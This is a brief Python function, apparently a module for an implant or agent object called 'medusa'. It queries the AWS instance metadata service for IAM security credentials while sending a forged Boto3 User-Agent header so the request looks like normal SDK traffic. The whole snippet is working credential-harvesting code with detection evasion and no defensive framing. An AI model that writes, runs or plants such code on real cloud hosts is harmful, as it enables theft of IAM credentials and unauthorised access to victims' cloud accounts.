def get_aws_perms(self):
    import requests
    headers = { 'User-Agent': 'Boto3/1.9.106 Python/3.6.7 Linux/4.15.0-48-generic Botocore/1.12.156'}
    the_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    resp = requests.get(the_url,headers=headers)
    return(resp.text)

setattr(medusa, "get_aws_perms", get_aws_perms)
